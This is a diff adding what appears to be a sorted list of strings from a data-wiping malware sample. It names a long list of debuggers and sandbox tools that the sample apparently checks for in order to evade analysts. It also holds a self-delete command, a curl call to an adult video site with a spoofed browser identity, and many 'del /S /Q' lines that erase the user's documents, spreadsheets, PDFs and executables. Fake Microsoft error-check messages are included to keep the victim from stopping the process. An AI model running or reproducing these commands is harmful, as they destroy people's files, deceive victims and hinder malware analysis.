@@ -1,0 +1,71 @@
+@echo OFF
+Autoruns.exe
+FakeNet.exe
+FileAlyzer2.exe
+HxD.exe
+ImmunityDebugger.exe
+LordPE.exe
+PE-bear.exe
+PEiD.exe
+PPEE.exe
+Procmon.exe
+Regshot-x64-Unicode.exe
+ResourceHacker.exe
+Scylla_x64.exe
+Scylla_x86.exe
+Tcpview.exe
+VBoxService.exe
+VBoxTray.exe
+VirtualBox.exea
+Wireshark.exe
+apateDNS.exe
+bindiff.exe
+cmd.exe /C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del /f /q "%s"
+curl -s -e https://www.xvideos.com -A "Mozilla / 5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko / 20100101 Firefox / 66.0" https://www.xvideos.com/video64080443/_ > nul
+del /S /Q *.csv c:\users\%username%\ >  nul
+del /S /Q *.doc c:\users\%username%\ >  nul
+del /S /Q *.docm c:\users\%username%\ > nul
+del /S /Q *.docx c:\users\%username%\ > nul
+del /S /Q *.dot c:\users\%username%\ >  nul
+del /S /Q *.dotm c:\users\%username%\ > nul
+del /S /Q *.dotx c:\users\%username%\ > nul
+del /S /Q *.exe c:\users\%username%\ >  nul
+del /S /Q *.jtd c:\users\%username%\ >  nul
+del /S /Q *.jtdc c:\users\%username%\ > nul
+del /S /Q *.jtt c:\users\%username%\ >  nul
+del /S /Q *.jttc c:\users\%username%\ > nul
+del /S /Q *.log c:\users\%username%\ >  nul
+del /S /Q *.pdf c:\users\%username%\ >  nul
+del /S /Q *.ppt c:\users\%username%\ >  nul
+del /S /Q *.pptm c:\users\%username%\ > nul
+del /S /Q *.pptx c:\users\%username%\ > nul
+del /S /Q *.txt c:\users\%username%\ >  nul
+del /S /Q *.xls c:\users\%username%\ >  nul
+del /S /Q *.xlsm c:\users\%username%\ > nul
+del /S /Q *.xlsx c:\users\%username%\ > nul
+depends.exe
+die.exe
+diel.exe
+dnSpy.exe
+echo Copyright (C) 2003-2015 Microsoft Corporation
+echo Copyright (C) 2003-2021 Adobe Corporation
+echo DO NOT STOP THE PROCESS
+echo Microsoft Windows 10 self error check has been ready...
+echo Wait a minute...
+idaq.exe
+idaq64.exe
+idaw.exe
+javaw.exe
+msedge.exe
+netmon.exe
+ollydbg.exe
+pexplorer.exe
+processhacker.exe
+procexp.exe
+procexp64.exe
+regmon.exe
+smsniff.exe
+windbg.exe
+x32dbg.exe
+x64dbg.exe
+x96dbg.exe
